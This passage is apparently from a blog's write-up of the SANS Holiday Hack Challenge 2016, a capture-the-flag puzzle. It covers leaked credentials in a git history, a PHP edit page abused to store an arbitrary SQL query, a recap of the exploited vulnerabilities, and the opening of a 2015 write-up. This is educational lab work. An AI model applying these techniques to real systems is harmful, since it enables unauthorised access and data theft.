&lt;p&gt;Let's see the different modifications made on &lt;code&gt;sprusage.sql&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; git log -p -- ./sprusage.sql
&lt;span class="go"&gt;[...]&lt;/span&gt;
&lt;span class="go"&gt;commit 62547860f9a6e0f3a3bdfd3f9b14fea3ac7f7c31&lt;/span&gt;
&lt;span class="go"&gt;Author: me &amp;lt;me@example.org&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;Date:   Mon Nov 21 21:15:08 2016 -0800&lt;/span&gt;

&lt;span class="go"&gt;    Fix database dump&lt;/span&gt;

&lt;span class="go"&gt;diff --git a/sprusage.sql b/sprusage.sql&lt;/span&gt;
&lt;span class="go"&gt;index a382229..b948dd0 100644&lt;/span&gt;
&lt;span class="go"&gt;--- a/sprusage.sql&lt;/span&gt;
&lt;span class="go"&gt;+++ b/sprusage.sql&lt;/span&gt;
&lt;span class="go"&gt;[...]&lt;/span&gt;
&lt;span class="go"&gt; LOCK TABLES `users` WRITE;&lt;/span&gt;
&lt;span class="go"&gt; /*!40000 ALTER TABLE `users` DISABLE KEYS */;&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;-INSERT INTO `users` VALUES (0,&amp;#39;administrator&amp;#39;,&amp;#39;KeepWatchingTheSkies&amp;#39;),(1,&amp;#39;guest&amp;#39;,&amp;#39;busyllama67&amp;#39;);&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt; /*!40000 ALTER TABLE `users` ENABLE KEYS */;&lt;/span&gt;
&lt;span class="go"&gt; UNLOCK TABLES;&lt;/span&gt;
&lt;span class="go"&gt; /*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see that &lt;code&gt;administrator&lt;/code&gt;'s password is
&lt;code&gt;KeepWatchingTheSkies&lt;/code&gt;. With these credentials, we have another method
of authenticating as &lt;code&gt;administrator&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Anyway, we now have access to the &lt;code&gt;edit.php&lt;/code&gt; page. This means that we can
edit past saved queries. However, we can only modify the name or the
description of the query, as shown on the screenshot above. Let's see this
functionality in action:&lt;/p&gt;
&lt;img alt="analytics_edit_first_use.png" class="align-center" src="/images/sans-christmas-challenge-2016/analytics_edit_first_use.png" /&gt;
&lt;p&gt;Hmm, we can see that the page checks for the presence of some parameters:
&lt;code&gt;name&lt;/code&gt;, &lt;code&gt;description&lt;/code&gt;... and &lt;code&gt;query&lt;/code&gt;! Let's take a look at
the &lt;code&gt;edit.php&lt;/code&gt; file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="k"&gt;else&lt;/span&gt;
  &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;mysqli_query&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$db&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SELECT * FROM `reports` WHERE `id`=&amp;#39;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nx"&gt;mysqli_real_escape_string&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$db&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;#39; LIMIT 0, 1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nv"&gt;$result&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nx"&gt;reply&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;500&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;MySQL Error: &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nx"&gt;mysqli_error&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$db&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
      &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="hll"&gt;    &lt;span class="nv"&gt;$row&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;mysqli_fetch_assoc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$result&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;
    &lt;span class="c1"&gt;# Update the row with the new values&lt;/span&gt;
    &lt;span class="nv"&gt;$set&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[];&lt;/span&gt;
&lt;span class="hll"&gt;    &lt;span class="k"&gt;foreach&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$row&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="nv"&gt;$name&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;$value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;      &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Checking for &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nb"&gt;htmlentities&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;...&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;      &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$name&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Yup!&amp;lt;br&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="nv"&gt;$set&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;`&lt;/span&gt;&lt;span class="si"&gt;$name&lt;/span&gt;&lt;span class="s2"&gt;`=&amp;#39;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nx"&gt;mysqli_real_escape_string&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$db&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$name&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see that the &lt;code&gt;edit.php&lt;/code&gt; page checks for the presence of every
columns of the &lt;code&gt;reports&lt;/code&gt; table in the &lt;code&gt;GET&lt;/code&gt; parameters. This means
that if we specify a &lt;code&gt;query&lt;/code&gt; &lt;code&gt;GET&lt;/code&gt; parameter, we can modify the
stored SQL query of a specific request!&lt;/p&gt;
&lt;p&gt;By looking the SQL schema file, &lt;code&gt;sprusage.sql&lt;/code&gt;, we can see the format
of the &lt;code&gt;audio&lt;/code&gt; table, containing the coveted audio file. We can now
create our fake query:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;HEX&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mp3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;audio&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;administrator&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can now store our malevolent query, and execute it:&lt;/p&gt;
&lt;img alt="analytics_edit_exploit.png" class="align-center" src="/images/sans-christmas-challenge-2016/analytics_edit_exploit.png" /&gt;
&lt;img alt="analytics_edit_exploit_result.png" class="align-center" src="/images/sans-christmas-challenge-2016/analytics_edit_exploit_result.png" /&gt;
&lt;p&gt;We can now recover our hex-encoded audio file, decode it, and get the last
audio file, &lt;code&gt;discombobulatedaudio7.mp3&lt;/code&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="part-5-discombobulated-audio"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id17"&gt;Part 5: Discombobulated Audio&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Now that we've hacked the SantaGram infrastructure, we have our weird audio
files. You can download them here:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2016/discombobulatedaudio1.mp3"&gt;discombobulatedaudio1.mp3&lt;/a&gt; (sha256: &lt;code&gt;8e759e28702e15720ff357694b1f8c9062680da933df5c9bdd16897bfcd00f01&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2016/discombobulatedaudio2.mp3"&gt;discombobulatedaudio2.mp3&lt;/a&gt; (sha256: &lt;code&gt;e0050656c5262116f82cbe82c85d0b91f9003f22568bee7f4ce7987744c34f99&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2016/discombobulatedaudio3.mp3"&gt;discombobulatedaudio3.mp3&lt;/a&gt; (sha256: &lt;code&gt;7c4a50771764b97227d27aa9dd0a99f396982882111a4924c0b51ee625251ac7&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2016/debug-20161224235959-0.mp3"&gt;debug-20161224235959-0.mp3&lt;/a&gt; (sha256: &lt;code&gt;35f5578bc12f096f4072e1dde2688b15145ba59bc48e9cb405576247c7e5a8bb&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2016/discombobulatedaudio5.mp3"&gt;discombobulatedaudio5.mp3&lt;/a&gt; (sha256: &lt;code&gt;c088b01e3accc21eda910f25755ebe2ccda3959e4810ce76cdd8cde8ff07651e&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2016/discombobulated-audio-6-XyzE3N9YqKNH.mp3"&gt;discombobulated-audio-6-XyzE3N9YqKNH.mp3&lt;/a&gt; (sha256: &lt;code&gt;776b26a58310d9ad80ab7b5c80fe4a5e03ed86210d9e28906fb93e30004ef35a&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2016/discombobulatedaudio7.mp3"&gt;discombobulatedaudio7.mp3&lt;/a&gt; (sha256: &lt;code&gt;60259f117d76535518dc2b3f01ae314f0969d61ae7066e75af708be7b059f214&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;At first, I suspected that, since all the files are approximately the same
length, you had to superimpose every one of them, or something, which led
to this horrendous result:&lt;/p&gt;
&lt;audio src="/docs/sans-christmas-challenge-2016/horrendous_audio_file.ogg" controls&gt;&lt;/audio&gt;&lt;p&gt;You can download the audio file &lt;a class="reference external" href="/docs/sans-christmas-challenge-2016/horrendous_audio_file.ogg"&gt;here&lt;/a&gt; (sha256: &lt;code&gt;c195d43e6445c84686a1bd4e89429db0f2802e8d8ae31e93769490d1204e098c&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;The solution is actually quite simpler. You just have to put the audio files
in the order we found them, then change the tempo of the audio track, to get
something intelligible:&lt;/p&gt;
&lt;audio src="/docs/sans-christmas-challenge-2016/de_discombobulated_audio.ogg" controls&gt;&lt;/audio&gt;&lt;p&gt;You can download the audio file &lt;a class="reference external" href="/docs/sans-christmas-challenge-2016/de_discombobulated_audio.ogg"&gt;here&lt;/a&gt; (sha256: &lt;code&gt;20e91d466c4cea4e1282e32dfc52725eadff05276d91bcc9fbd547c09bf2964a&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;If you can't quite hear the spoken phrase, it's:&lt;/p&gt;
&lt;blockquote&gt;
Father Christmas, Santa Claus or, as I've always known him, Jeff.&lt;/blockquote&gt;
&lt;p&gt;Now, I didn't recognize the reference right away, but if you
&lt;a class="reference external" href="https://duckduckgo.com/?q=%22Father+Christmas%2C+Santa+Claus+or%2C+as+I%27ve+always+known+him%2C+Jeff.%22&amp;amp;ia=web"&gt;DuckDuckgo the sentence&lt;/a&gt;
(or part of it if you only got some audio files), you find that it's from a
Doctor Who Christmas Special, &lt;a class="reference external" href="http://www.imdb.com/title/tt1672218/"&gt;A Christmas Carol&lt;/a&gt;.
Now, I DID see this Doctor Who, but failed to remember the reference, so I'm
still ashamed of this.&lt;/p&gt;
&lt;p&gt;Anyway, if you remember, there was still one door in the North Pole we couldn't
open: the door in the Corridor. Since the audio pointed to Doctor Who, I tried
every element of the show I could think of (&amp;quot;The Doctor&amp;quot;, &amp;quot;Amy Pond&amp;quot;, &amp;quot;The
Master&amp;quot;, &amp;quot;Tardis&amp;quot;, &amp;quot;tardis&amp;quot;, &amp;quot;TARDIS&amp;quot;, &amp;quot;Geronimo&amp;quot;, &amp;quot;Geronimo!&amp;quot;, &amp;quot;Geronimo!!!&amp;quot;,
...). Turns out, the passphrase to the door was just the full sentence we
hear in the audio file. Trying too hard leads nowhere.&lt;/p&gt;
&lt;p&gt;Now that we've opened the door, we can see Who is behind this nefarious plot
(see what I did there?).&lt;/p&gt;
&lt;img alt="the_doctor.png" class="align-center" src="/images/sans-christmas-challenge-2016/the_doctor.png" /&gt;
&lt;p&gt;It was the Doctor all along! If we talk to him, he explains his plan:&lt;/p&gt;
&lt;blockquote&gt;
The question of the hour is this: Who nabbed Santa. The answer? Yes,
I did. Next question: Why would anyone in his right mind kidnap Santa
Claus? The answer: Do I look like I'm in my right mind? I'm a madman
with a box. I have looked into the time vortex and I have seen a
universe in which the Star Wars Holiday Special was NEVER released.
In that universe, 1978 came and went as normal. No one had to endure
the misery of watching that abominable blight. People were happy
there. It's a better life, I tell you, a better world than the
scarred one we endure here. Give me a world like that. Just once. So
I did what I had to do. I knew that Santa's powerful North Pole
Wonderland Magick could prevent the Star Wars Special from being
released, if I could leverage that magick with my own abilities back
in 1978. But Jeff refused to come with me, insisting on the mad idea
that it is better to maintain the integrity of the universe’s
timeline. So I had no choice – I had to kidnap him. It was sort
of one of those days. Well. You know what I mean. Anyway... Since you
interfered with my plan, we'll have to live with the Star Wars
Holiday Special in this universe... FOREVER.  If we attempt to go
back again, to cross our own timeline, we'll cause a temporal
paradox, a wound in time. We'll never be rid of it now. The Star Wars
Holiday Special will plague this world until time itself ends... All
because you foiled my brilliant plan.  Nice work.&lt;/blockquote&gt;
&lt;p&gt;Now, although I'm a major Star Wars fan, I've always decided to listen to the
advice of my elders regarding the &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Star_Wars_Holiday_Special"&gt;Christmas Special&lt;/a&gt;
(shout out to &lt;a class="reference external" href="https://xkcd.com/653/"&gt;Randal Munroe&lt;/a&gt;), and I've never
watched it. Guess I'll continue to refrain from watching it. Brrrr...&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="epilogue-bringing-it-all-home"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id18"&gt;Epilogue: Bringing It All Home&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;As the title suggests, it's time to bring it home, and answer each question of
the challenge:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;&lt;cite&gt;What is the secret message in Santa's tweets?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The secret message in Santa's tweets is &lt;code&gt;bugbounty&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="2"&gt;
&lt;li&gt;&lt;cite&gt;What is inside the ZIP file distributed by Santa's team?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Inside the ZIP file distributed by Santa's team, there is a copy of the Android
application for their bug bounty, SantaGram_4.2.apk.&lt;/p&gt;
&lt;ol class="arabic simple" start="3"&gt;
&lt;li&gt;&lt;cite&gt;What username and password are embedded in the APK file?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The credentials in the APK file are &lt;code&gt;guest/busyreindeer78&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="4"&gt;
&lt;li&gt;&lt;cite&gt;What is the name of the audible component (audio file. in the SantaGram APK
file?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The name of the audio file in the SantaGram APK file is
&lt;code&gt;discombobulatedaudio1.mp3&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="5"&gt;
&lt;li&gt;&lt;cite&gt;What is the password for the &amp;quot;cranpi&amp;quot; account on the Cranberry Pi system?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The password of the &amp;quot;cranpi&amp;quot; account is &lt;code&gt;yummycookies&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="6"&gt;
&lt;li&gt;&lt;cite&gt;How did you open each terminal door and where had the villain imprisoned
Santa?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;strong&gt;Elf House #2&lt;/strong&gt;: using &lt;code&gt;sudo&lt;/code&gt; to execute commands as &lt;code&gt;itchy&lt;/code&gt;, we
can read the PCAP file, containing the two halves of the passphrase, one
encoded in plain 7-bit ASCII, one encoded in 16-bit big endian.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Workshop, first door&lt;/strong&gt;: using &lt;code&gt;find&lt;/code&gt;, we can find the file containing
the passphrase, and print its content.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Santa's office&lt;/strong&gt;: using our &lt;cite&gt;*cough cough*&lt;/cite&gt; knowledge of the film WarGames,
we can get the correct passphrase.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Workshop, second door&lt;/strong&gt;: by analyzing the &lt;code&gt;wumpus&lt;/code&gt; program, we can
find the function in charge of computing the passphrase, and directly call
it.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Train station&lt;/strong&gt;: since the &lt;code&gt;HELP&lt;/code&gt; function uses &lt;code&gt;less&lt;/code&gt; to print
the content of the help file, we can use &lt;code&gt;less&lt;/code&gt;'s features to open
other files, including the one containing the passphrase.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The villain had imprisoned Santa Claus in the DFER room, &lt;strong&gt;in 1978&lt;/strong&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="7"&gt;
&lt;li&gt;&lt;cite&gt;For each of those six items, which vulnerabilities did you discover and
exploit?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;dl class="first docutils"&gt;
&lt;dt&gt;&lt;strong&gt;The Mobile Analytics Server (via credentialed login access)&lt;/strong&gt;:&lt;/dt&gt;
&lt;dd&gt;&lt;ul class="first last"&gt;
&lt;li&gt;Credentials stored in plaintext in the SantaGram APK.&lt;/li&gt;
&lt;li&gt;Use of these credentials on the analytics server.&lt;/li&gt;
&lt;/ul&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;/li&gt;
&lt;li&gt;&lt;dl class="first docutils"&gt;
&lt;dt&gt;&lt;strong&gt;The Dungeon Game&lt;/strong&gt;&lt;/dt&gt;
&lt;dd&gt;&lt;ul class="first last"&gt;
&lt;li&gt;Finding of the Dungeon CLI with &lt;code&gt;nmap&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Using our &lt;cite&gt;*cough cough*&lt;/cite&gt; knowledge of the video game Zork to get the
email address of Peppermint.&lt;/li&gt;
&lt;li&gt;Sending an email to Peppermint to receive the audio file.&lt;/li&gt;
&lt;/ul&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;/li&gt;
&lt;li&gt;&lt;dl class="first docutils"&gt;
&lt;dt&gt;&lt;strong&gt;The Debug Server&lt;/strong&gt;:&lt;/dt&gt;
&lt;dd&gt;&lt;ul class="first last"&gt;
&lt;li&gt;Patching of the SantaGram APK to enable debug data.&lt;/li&gt;
&lt;li&gt;JSON request tampering to increase verbosity of the debug server.&lt;/li&gt;
&lt;li&gt;Disclosing of the path of the audio file in the response of the debug
server.&lt;/li&gt;
&lt;/ul&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;/li&gt;
&lt;li&gt;&lt;dl class="first docutils"&gt;
&lt;dt&gt;&lt;strong&gt;The Banner Ad Server&lt;/strong&gt;:&lt;/dt&gt;
&lt;dd&gt;&lt;ul class="first last"&gt;
&lt;li&gt;Using Meteor Miner, we could list the different routes.&lt;/li&gt;
&lt;li&gt;Disclosing of the &lt;code&gt;/admin/quotes&lt;/code&gt; route.&lt;/li&gt;
&lt;li&gt;Using Meteor Miner, we could list the collection of quotes.&lt;/li&gt;
&lt;li&gt;Disclosing of the path of the audio file in the attributes of one of the
quotes.&lt;/li&gt;
&lt;/ul&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;/li&gt;
&lt;li&gt;&lt;dl class="first docutils"&gt;
&lt;dt&gt;&lt;strong&gt;The Uncaught Exception Handler Server&lt;/strong&gt;:&lt;/dt&gt;
&lt;dd&gt;&lt;ul class="first last"&gt;
&lt;li&gt;Verbose error allowing to build a correct &lt;code&gt;ReadCrashDump&lt;/code&gt; request.&lt;/li&gt;
&lt;li&gt;Local File Inclusion in the &lt;code&gt;exception.php&lt;/code&gt; page.&lt;/li&gt;
&lt;/ul&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;/li&gt;
&lt;li&gt;&lt;dl class="first docutils"&gt;
&lt;dt&gt;&lt;strong&gt;The Mobile Analytics Server (post authentication)&lt;/strong&gt;:&lt;/dt&gt;
&lt;dd&gt;&lt;ul class="first last"&gt;
&lt;li&gt;Source files recovery with open Git repository.&lt;/li&gt;
&lt;li&gt;Creation of an administrator cookie.&lt;/li&gt;
&lt;li&gt;Exploitation of the &lt;code&gt;edit.php&lt;/code&gt; page to store an arbitrary SQL
query.&lt;/li&gt;
&lt;/ul&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol class="arabic simple" start="8"&gt;
&lt;li&gt;&lt;cite&gt;What are the names of the audio files you discovered from each system above?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;strong&gt;The Mobile Analytics Server (via credentialed login access)&lt;/strong&gt;: &lt;code&gt;discombobulatedaudio2.mp3&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;The Dungeon Game&lt;/strong&gt;: &lt;code&gt;discombobulatedaudio3.mp3&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;The Debug Server&lt;/strong&gt;: &lt;code&gt;debug-20161224235959-0.mp3&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;The Banner Ad Server&lt;/strong&gt;: &lt;code&gt;discombobulatedaudio5.mp3&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;The Uncaught Exception Handler Server&lt;/strong&gt;: &lt;code&gt;discombobulated-audio-6-XyzE3N9YqKNH.mp3&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;The Mobile Analytics Server (post authentication)&lt;/strong&gt;: &lt;code&gt;discombobulatedaudio7.mp3&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol class="arabic simple" start="9"&gt;
&lt;li&gt;&lt;cite&gt;Who is the villain behind the nefarious plot?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The villain behind the nefarious plot is the Doctor.&lt;/p&gt;
&lt;ol class="arabic simple" start="10"&gt;
&lt;li&gt;&lt;cite&gt;Why had the villain abducted Santa?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The Doctor had abducted Santa to use his magick to prevent the Star Wars
Christmas special from ever coming out.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="conclusion"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id19"&gt;Conclusion&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Once again, a great challenge by the SANS, which I managed, this time, to
finish completely! I also noticed that I didn't improve my skills in reverse
engineering and binary analysis, which is a skill I wanted to improve, as said
in last year's write-up. Bad me...&lt;/p&gt;
&lt;p&gt;Anyway, see you next year for the next SANS Christmas Challenge ;) !&lt;/p&gt;
&lt;/div&gt;
</content></entry><entry><title>SANS Christmas Challenge 2015</title><link href="https://allyourbase.utouch.fr/posts/2016/01/09/sans-christmas-challenge-2015/" rel="alternate"></link><published>2016-01-09T00:00:00+01:00</published><updated>2016-01-09T00:00:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2016-01-09:/posts/2016/01/09/sans-christmas-challenge-2015/</id><summary type="html">&lt;img alt="sans_christmas_challenge_2015_logo.png" class="align-center" src="/images/sans-christmas-challenge-2015/sans_christmas_challenge_2015_logo.png" /&gt;
&lt;p&gt;This year again, the SANS institute delights us with a wonderful
&lt;a class="reference external" href="https://holidayhackchallenge.com/2015/"&gt;Christmas Challenge&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We follow the &lt;a class="reference external" href="https://quest.holidayhackchallenge.com/"&gt;Dosis family&lt;/a&gt;,
after they purchase a
&lt;a class="reference external" href="https://en.wikipedia.org/wiki/The_Elf_on_the_Shelf"&gt;Gnome in Your Home&lt;/a&gt;
for their kids, Jessica and Joshua. These two kids, especially bright
for their age, tinker with the gnome, to find that it has a …&lt;/p&gt;</summary><content type="html">&lt;img alt="sans_christmas_challenge_2015_logo.png" class="align-center" src="/images/sans-christmas-challenge-2015/sans_christmas_challenge_2015_logo.png" /&gt;
&lt;p&gt;This year again, the SANS institute delights us with a wonderful
&lt;a class="reference external" href="https://holidayhackchallenge.com/2015/"&gt;Christmas Challenge&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We follow the &lt;a class="reference external" href="https://quest.holidayhackchallenge.com/"&gt;Dosis family&lt;/a&gt;,
after they purchase a
&lt;a class="reference external" href="https://en.wikipedia.org/wiki/The_Elf_on_the_Shelf"&gt;Gnome in Your Home&lt;/a&gt;
for their kids, Jessica and Joshua. These two kids, especially bright
for their age, tinker with the gnome, to find that it has a weird,
and possible illegal behaviour.&lt;/p&gt;
&lt;p&gt;It all begins when Joshua gives us a capture file of the network
communications he recorded from the gnome...&lt;/p&gt;
&lt;div class="contents topic" id="table-of-contents"&gt;
&lt;p class="topic-title first"&gt;Table of contents&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;a class="reference internal" href="#part-1-dance-of-the-sugar-gnome-fairies-curious-wireless-packets" id="id6"&gt;Part 1: Dance of the Sugar Gnome Fairies: &lt;em&gt;Curious Wireless Packets&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
